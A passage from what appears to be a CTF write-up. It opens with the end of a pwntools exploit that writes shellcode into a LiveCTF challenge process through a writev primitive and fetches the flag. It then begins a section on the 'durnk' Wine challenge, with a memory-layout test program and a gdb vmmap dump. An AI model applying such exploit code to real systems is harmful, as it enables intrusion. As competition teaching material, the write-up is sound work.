</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    push 110
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    pop rax
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    syscall
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r10, rax
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rdi, rax
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rsi, </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rdx, </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rcx, </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    call rcx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#f92672">.</span>format(<span style="color:#ae81ff">0x3510</span><span style="color:#f92672">+</span>pie, libc<span style="color:#f92672">+</span><span style="color:#ae81ff">0x50d70</span> , writev_helper))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    push 110
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    pop rax
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    syscall
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov r10, rax
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rdi, rax
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rsi, </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rdx, </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rcx, </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    call rcx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#f92672">.</span>format(<span style="color:#ae81ff">0x3500</span><span style="color:#f92672">+</span>pie,pie<span style="color:#f92672">+</span><span style="color:#ae81ff">0x000000000000134D</span> , writev_helper))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range((len(pl))<span style="color:#f92672">//</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>    writev(write_<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>, u64(pl[i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>:(i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#39;</span>)))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>write_ <span style="color:#f92672">=</span> pie<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1488</span>
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">=</span> asm(<span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    mov rcx, </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    jmp rcx
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#f92672">.</span>format(kk))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range((len(pl))<span style="color:#f92672">//</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>    writev(write_<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>, u64(pl[i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>:(i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#39;</span>)))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>writev(write_<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>, u64(p64(<span style="color:#ae81ff">0x9090909090909090</span>)))
</span></span><span style="display:flex;"><span>sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;./submitter&#39;</span>)
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline_contains(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;LiveCTF{&#39;</span>)<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;Flag: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span>, flag)
</span></span></code></pre></div><h1 id="pwn---durnk-winapi">Pwn - durnk (winapi)</h1>
<p><a href="">Attachment</a></p>
<p>This is the first time I encountered a window executable run based on Wine. So, I will delve into it.</p>
<h2 id="what-is-wine">What is WINE</h2>
<blockquote>
<p>Wine (recursive backronym for Wine Is Not an Emulator) is a compatibility layer that aims to allow computer programs (application software and computer games) developed for Microsoft Windows to run on Unix-like operating systems. Wine emulates the Windows runtime environment by translating Windows system calls into POSIX-compliant system calls, recreating the directory structure of Windows systems, and providing alternative implementations of Windows system libraries (from wikipedia).</p>
</blockquote>
<ul>
<li>Not an emulator that creates a virtual machine in which the Windows application is then executed, but a translation layer between the application and the kernel. This layer creates an environment that makes the application ‘feel’ like it’s running on a Windows system, while in fact it is running on Linux.</li>
</ul>
<h2 id="debug">Debug</h2>
<p>When you have a wine application running and take a look at the active processes (for example via htop) you will notice that the application is listed as just an other Linux process. This means we can examine it using gdb!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>╭─<span style="color:#f92672">[</span>nvm<span style="color:#f92672">]</span> as kyrie in ~/CTF/2024/defcon/durnk/handout                                                                                                           16:41:49
</span></span><span style="display:flex;"><span>╰──➤ ps aux | grep <span style="color:#e6db74">&#34;challenge&#34;</span>
</span></span><span style="display:flex;"><span>kyrie      <span style="color:#ae81ff">50236</span>  0.0  0.0  <span style="color:#ae81ff">67096</span>  <span style="color:#ae81ff">7728</span> pts/1    S+   16:24   0:00 Z:<span style="color:#ae81ff">\h</span>ome<span style="color:#ae81ff">\k</span>yrie<span style="color:#ae81ff">\C</span>TF<span style="color:#ae81ff">\2</span>024<span style="color:#ae81ff">\d</span>efcon<span style="color:#ae81ff">\d</span>urnk<span style="color:#ae81ff">\h</span>andout<span style="color:#ae81ff">\c</span>hallenge.exe
</span></span><span style="display:flex;"><span>kyrie      <span style="color:#ae81ff">53976</span>  0.0  0.0  <span style="color:#ae81ff">67096</span>  <span style="color:#ae81ff">7980</span> pts/2    S+   16:38   0:00 Z:<span style="color:#ae81ff">\h</span>ome<span style="color:#ae81ff">\k</span>yrie<span style="color:#ae81ff">\C</span>TF<span style="color:#ae81ff">\2</span>024<span style="color:#ae81ff">\d</span>efcon<span style="color:#ae81ff">\d</span>urnk<span style="color:#ae81ff">\h</span>andout<span style="color:#ae81ff">\c</span>hallenge.exe
</span></span><span style="display:flex;"><span>kyrie      <span style="color:#ae81ff">54639</span>  0.0  0.0  <span style="color:#ae81ff">12088</span>  <span style="color:#ae81ff">2432</span> pts/8    S+   16:41   0:00 grep --color<span style="color:#f92672">=</span>auto --exclude-dir<span style="color:#f92672">=</span>.bzr --exclude-dir<span style="color:#f92672">=</span>CVS --exclude-dir<span style="color:#f92672">=</span>.git --exclude-dir<span style="color:#f92672">=</span>.hg --exclude-dir<span style="color:#f92672">=</span>.svn --exclude-dir<span style="color:#f92672">=</span>.idea --exclude-dir<span style="color:#f92672">=</span>.tox challenge
</span></span></code></pre></div><p>Wine actually has it’s own debugger, <a href="https://wiki.winehq.org/Wine_Developer%27s_Guide/Debugging_Wine">WineDbg</a>. But I will ignore it and use pwndbg instead =))</p>
<p>I used the following this small C program to explore the memory layout of the WINE process and compile this with this command:
(make sure we have mingW downloaded)</p>
<pre tabindex="0"><code class="language-shell!" data-lang="shell!">$ x86_64-w64-mingw32-gcc -o test.exe test.c
</code></pre><p><code>test.c</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> WINAPI <span style="color:#a6e22e">WinMain</span>(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, <span style="color:#66d9ef">int</span> nShowCmd)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;WinMain:</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,WinMain);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    HMODULE kernel32 <span style="color:#f92672">=</span> <span style="color:#a6e22e">LoadLibrary</span>(<span style="color:#e6db74">&#34;kernel32.dll&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;kernel32.dll:</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,kernel32);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;GetProcAddress:</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,GetProcAddress);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    HMODULE msvcrt <span style="color:#f92672">=</span> <span style="color:#a6e22e">LoadLibrary</span>(<span style="color:#e6db74">&#34;msvcrt.dll&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;msvcrt.dll:</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,msvcrt);    
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    HMODULE ntdll <span style="color:#f92672">=</span> <span style="color:#a6e22e">LoadLibrary</span>(<span style="color:#e6db74">&#34;ntdll.dll&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;ntdll.dll:</span><span style="color:#ae81ff">\t\t</span><span style="color:#e6db74">%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,ntdll);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> dummy;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Stack:</span><span style="color:#ae81ff">\t\t\t</span><span style="color:#e6db74">%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">&amp;</span>dummy);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>heap <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">128</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Heap:</span><span style="color:#ae81ff">\t\t\t</span><span style="color:#e6db74">%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,heap);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">getchar</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Run this test through Wine</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ wine test.exe 
</span></span></code></pre></div><p>In another terminal, type this command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>gdb -p <span style="color:#66d9ef">$(</span>pgrep -f test.exe<span style="color:#66d9ef">)</span>
</span></span></code></pre></div><p>Let’s take a closer look at the memory of the test.exe process via gdb’s vmmap command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>pwndbg&gt; vmmap
</span></span><span style="display:flex;"><span>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
</span></span><span style="display:flex;"><span>             Start                End Perm     Size Offset File
</span></span><span style="display:flex;"><span>        0x7bb50000         0x7bb51000 r--p     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> /opt/wine-stable/lib64/wine/x86_64-windows/msvcrt.dll
</span></span><span style="display:flex;"><span>        0x7bb51000         0x7bbc0000 r-xp    6f000   <span style="color:#ae81ff">1000</span> /opt/wine-stable/lib64/wine/x86_64-windows/msvcrt.dll
</span></span><span style="display:flex;"><span>        0x7bbc0000         0x7bbc4000 rw-p     <span style="color:#ae81ff">4000</span>  <span style="color:#ae81ff">70000</span> /opt/wine-stable/lib64/wine/x86_64-windows/msvcrt.dll
</span></span><span style="display:flex;"><span>        0x7bbc4000         0x7bbdf000 r--p    1b000  <span style="color:#ae81ff">74000</span> /opt/wine-stable/lib64/wine/x86_64-windows/msvcrt.dll
</span></span><span style="display:flex;"><span>        0x7bbdf000         0x7bbe1000 rw-p     <span style="color:#ae81ff">2000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7bbdf<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>        0x7bbe1000         0x7bbe8000 r--p     <span style="color:#ae81ff">7000</span>  8f000 /opt/wine-stable/lib64/wine/x86_64-windows/msvcrt.dll
</span></span><span style="display:flex;"><span>        0x7bbe8000         0x7bbeb000 rw-p     <span style="color:#ae81ff">3000</span>  <span style="color:#ae81ff">96000</span> /opt/wine-stable/lib64/wine/x86_64-windows/msvcrt.dll
</span></span><span style="display:flex;"><span>        0x7bbeb000         0x7bea6000 r--p   2bb000  <span style="color:#ae81ff">99000</span> /opt/wine-stable/lib64/wine/x86_64-windows/msvcrt.dll
</span></span><span style="display:flex;"><span>        0x7fde0000         0x7ffc0000 ---p   1e0000      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7fde0<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>        0x7ffc0000         0x7ffe0000 rw-p    <span style="color:#ae81ff">20000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffc0<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>        0x7ffe0000         0x7ffe1000 r--p     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> /tmp/.wine-1000/server-803-72295/tmpmap-6be2772d <span style="color:#f92672">(</span>deleted<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>        0x7ffe1000         0x7ffe2000 rw-p     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffe1<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>        0x7ffe2000         0x7fff0000 ---p     e000      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_7ffe2<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>       0x140000000        0x140001000 r--p     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> /home/kyrie/CTF/2024/defcon/durnk/handout/test.exe
</span></span><span style="display:flex;"><span>       0x140001000        0x140008000 r-xp     <span style="color:#ae81ff">7000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_140001<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>       0x140008000        0x140009000 rw-p     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_140008<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>       0x140009000        0x14000c000 r--p     <span style="color:#ae81ff">3000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_140009<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>       0x14000c000        0x14000d000 rw-p     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_14000c<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>       0x14000d000        0x14000e000 rw-p     <span style="color:#ae81ff">1000</span>   <span style="color:#ae81ff">9000</span> /home/kyrie/CTF/2024/defcon/durnk/handout/test.exe
</span></span><span style="display:flex;"><span>       0x14000e000        0x140010000 rw-p     <span style="color:#ae81ff">2000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_14000e<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>       0x140010000        0x14007e000 r--p    6e000      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_140010<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x5555562bb000     0x5555562dc000 rw-p    <span style="color:#ae81ff">21000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>heap<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x6fffff440000     0x6fffff441000 r--p     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> /opt/wine-stable/lib64/wine/x86_64-windows/kernelbase.dll
</span></span><span style="display:flex;"><span>    0x6fffff441000     0x6fffff4cd000 r-xp    8c000   <span style="color:#ae81ff">1000</span> /opt/wine-stable/lib64/wine/x86_64-windows/kernelbase.dll
</span></span><span style="display:flex;"><span>    0x6fffff4cd000     0x6fffff4d1000 rw-p     <span style="color:#ae81ff">4000</span>  8d000 /opt/wine-stable/lib64/wine/x86_64-windows/kernelbase.dll
</span></span><span style="display:flex;"><span>    0x6fffff4d1000     0x6fffff4f8000 r--p    <span style="color:#ae81ff">27000</span>  <span style="color:#ae81ff">91000</span> /opt/wine-stable/lib64/wine/x86_64-windows/kernelbase.dll
</span></span><span style="display:flex;"><span>    0x6fffff4f8000     0x6fffff4fb000 rw-p     <span style="color:#ae81ff">3000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_6fffff4f8<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x6fffff4fb000     0x6fffff506000 r--p     b000  b8000 /opt/wine-stable/lib64/wine/x86_64-windows/kernelbase.dll
</span></span><span style="display:flex;"><span>    0x6fffff506000     0x6fffff6d7000 rw-p   1d1000  c3000 /opt/wine-stable/lib64/wine/x86_64-windows/kernelbase.dll
</span></span><span style="display:flex;"><span>    0x6fffff6d7000     0x6fffffa68000 r--p   <span style="color:#ae81ff">391000</span> <span style="color:#ae81ff">294000</span> /opt/wine-stable/lib64/wine/x86_64-windows/kernelbase.dll
</span></span><span style="display:flex;"><span>    0x6fffffa80000     0x6fffffa81000 r--p     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> /opt/wine-stable/lib64/wine/x86_64-windows/kernel32.dll
</span></span><span style="display:flex;"><span>    0x6fffffa81000     0x6fffffab2000 r-xp    <span style="color:#ae81ff">31000</span>   <span style="color:#ae81ff">1000</span> /opt/wine-stable/lib64/wine/x86_64-windows/kernel32.dll
</span></span><span style="display:flex;"><span>    0x6fffffab2000     0x6fffffab5000 rw-p     <span style="color:#ae81ff">3000</span>  <span style="color:#ae81ff">32000</span> /opt/wine-stable/lib64/wine/x86_64-windows/kernel32.dll
</span></span><span style="display:flex;"><span>    0x6fffffab5000     0x6fffffac3000 r--p     e000  <span style="color:#ae81ff">35000</span> /opt/wine-stable/lib64/wine/x86_64-windows/kernel32.dll
</span></span><span style="display:flex;"><span>    0x6fffffac3000     0x6fffffac4000 rw-p     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_6fffffac3<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x6fffffac4000     0x6fffffacf000 r--p     b000  <span style="color:#ae81ff">43000</span> /opt/wine-stable/lib64/wine/x86_64-windows/kernel32.dll
</span></span><span style="display:flex;"><span>    0x6fffffacf000     0x6fffffae2000 rw-p    <span style="color:#ae81ff">13000</span>  4e000 /opt/wine-stable/lib64/wine/x86_64-windows/kernel32.dll
</span></span><span style="display:flex;"><span>    0x6fffffae2000     0x6fffffc39000 r--p   <span style="color:#ae81ff">157000</span>  <span style="color:#ae81ff">61000</span> /opt/wine-stable/lib64/wine/x86_64-windows/kernel32.dll
</span></span><span style="display:flex;"><span>    0x6fffffc50000     0x6fffffc51000 r--p     <span style="color:#ae81ff">1000</span>      <span style="color:#ae81ff">0</span> /opt/wine-stable/lib64/wine/x86_64-windows/ntdll.dll
</span></span><span style="display:flex;"><span>    0x6fffffc51000     0x6fffffcbe000 r-xp    6d000   <span style="color:#ae81ff">1000</span> /opt/wine-stable/lib64/wine/x86_64-windows/ntdll.dll
</span></span><span style="display:flex;"><span>    0x6fffffcbe000     0x6fffffcc2000 rw-p     <span style="color:#ae81ff">4000</span>  6e000 /opt/wine-stable/lib64/wine/x86_64-windows/ntdll.dll
</span></span><span style="display:flex;"><span>    0x6fffffcc2000     0x6fffffce5000 r--p    <span style="color:#ae81ff">23000</span>  <span style="color:#ae81ff">72000</span> /opt/wine-stable/lib64/wine/x86_64-windows/ntdll.dll
</span></span><span style="display:flex;"><span>    0x6fffffce5000     0x6fffffce9000 rw-p     <span style="color:#ae81ff">4000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_6fffffce5<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x6fffffce9000     0x6fffffcf4000 r--p     b000  <span style="color:#ae81ff">95000</span> /opt/wine-stable/lib64/wine/x86_64-windows/ntdll.dll
</span></span><span style="display:flex;"><span>    0x6fffffcf4000     0x6fffffcf6000 rw-p     <span style="color:#ae81ff">2000</span>  a0000 /opt/wine-stable/lib64/wine/x86_64-windows/ntdll.dll
</span></span><span style="display:flex;"><span>    0x6fffffcf6000     0x6ffffffea000 r--p   2f4000  a2000 /opt/wine-stable/lib64/wine/x86_64-windows/ntdll.dll
</span></span><span style="display:flex;"><span>    0x79971c900000     0x79971cc00000 rw-p   <span style="color:#ae81ff">300000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_79971c900<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x79971cc00000     0x79971d442000 r--p   <span style="color:#ae81ff">842000</span>      <span style="color:#ae81ff">0</span> /usr/lib/locale/locale-archive
</span></span><span style="display:flex;"><span>    0x79971d500000     0x79971d600000 rw-p   <span style="color:#ae81ff">100000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_79971d500<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x79971d600000     0x79971d628000 r--p    <span style="color:#ae81ff">28000</span>      <span style="color:#ae81ff">0</span> /usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span style="display:flex;"><span>    0x79971d628000     0x79971d7bd000 r-xp   <span style="color:#ae81ff">195000</span>  <span style="color:#ae81ff">28000</span> /usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span style="display:flex;"><span>    0x79971d7bd000     0x79971d815000 r--p    <span style="color:#ae81ff">58000</span> 1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span style="display:flex;"><span>    0x79971d815000     0x79971d816000 ---p     <span style="color:#ae81ff">1000</span> <span style="color:#ae81ff">215000</span> /usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span style="display:flex;"><span>    0x79971d816000     0x79971d81a000 r--p     <span style="color:#ae81ff">4000</span> <span style="color:#ae81ff">215000</span> /usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span style="display:flex;"><span>    0x79971d81a000     0x79971d81c000 rw-p     <span style="color:#ae81ff">2000</span> <span style="color:#ae81ff">219000</span> /usr/lib/x86_64-linux-gnu/libc.so.6
</span></span><span style="display:flex;"><span>    0x79971d81c000     0x79971d829000 rw-p     d000      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_79971d81c<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x79971d857000     0x79971d85a000 r--p     <span style="color:#ae81ff">3000</span>      <span style="color:#ae81ff">0</span> /usr/lib/x86_64-linux-gnu/liblzma.so.5.2.5
</span></span><span style="display:flex;"><span>    0x79971d85a000     0x79971d875000 r-xp    1b000   <span style="color:#ae81ff">3000</span> /usr/lib/x86_64-linux-gnu/liblzma.so.5.2.5
</span></span><span style="display:flex;"><span>    0x79971d875000     0x79971d880000 r--p     b000  1e000 /usr/lib/x86_64-linux-gnu/liblzma.so.5.2.5
</span></span><span style="display:flex;"><span>    0x79971d880000     0x79971d881000 r--p     <span style="color:#ae81ff">1000</span>  <span style="color:#ae81ff">28000</span> /usr/lib/x86_64-linux-gnu/liblzma.so.5.2.5
</span></span><span style="display:flex;"><span>    0x79971d881000     0x79971d882000 rw-p     <span style="color:#ae81ff">1000</span>  <span style="color:#ae81ff">29000</span> /usr/lib/x86_64-linux-gnu/liblzma.so.5.2.5
</span></span><span style="display:flex;"><span>    0x79971d882000     0x79971d884000 r--p     <span style="color:#ae81ff">2000</span>      <span style="color:#ae81ff">0</span> /usr/lib/x86_64-linux-gnu/libunwind.so.8.0.1
</span></span><span style="display:flex;"><span>    0x79971d884000     0x79971d88e000 r-xp     a000   <span style="color:#ae81ff">2000</span> /usr/lib/x86_64-linux-gnu/libunwind.so.8.0.1
</span></span><span style="display:flex;"><span>    0x79971d88e000     0x79971d891000 r--p     <span style="color:#ae81ff">3000</span>   c000 /usr/lib/x86_64-linux-gnu/libunwind.so.8.0.1
</span></span><span style="display:flex;"><span>    0x79971d891000     0x79971d892000 r--p     <span style="color:#ae81ff">1000</span>   e000 /usr/lib/x86_64-linux-gnu/libunwind.so.8.0.1
</span></span><span style="display:flex;"><span>    0x79971d892000     0x79971d893000 rw-p     <span style="color:#ae81ff">1000</span>   f000 /usr/lib/x86_64-linux-gnu/libunwind.so.8.0.1
</span></span><span style="display:flex;"><span>    0x79971d893000     0x79971d89d000 rw-p     a000      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_79971d893<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>    0x79971d89d000     0x79971d8a7000 r--p     a000      <span style="color:#ae81ff">0</span> /opt/wine-stable/lib64/wine/x86_64-unix/ntdll.so
</span></span><span style="display:flex;"><span>    0x79971d8a7000     0x79971d903000 r-xp    5c000   a000 /opt/wine-stable/lib64/wine/x86_64-unix/ntdll.so
</span></span><span style="display:flex;"><span>    0x79971d903000     0x79971d920000 r--p    1d000  <span style="color:#ae81ff">66000</span> /opt/wine-stable/lib64/wine/x86_64-unix/ntdll.so
</span></span><span style="display:flex;"><span>    0x79971d920000     0x79971d922000 r--p     <span style="color:#ae81ff">2000</span>  <span style="color:#ae81ff">82000</span> /opt/wine-stable/lib64/wine/x86_64-unix/ntdll.so
</span></span><span style="display:flex;"><span>    0x79971d922000     0x79971d923000 rw-p     <span style="color:#ae81ff">1000</span>  <span style="color:#ae81ff">84000</span> /opt/wine-stable/lib64/wine/x86_64-unix/ntdll.so
</span></span><span style="display:flex;"><span>    0x79971d923000     0x79971d95b000 rw-p    <span style="color:#ae81ff">38000</span>      <span style="color:#ae81ff">0</span> <span style="color:#f92672">[</span>anon_79971d923<span style="color:#f92672">]</span>
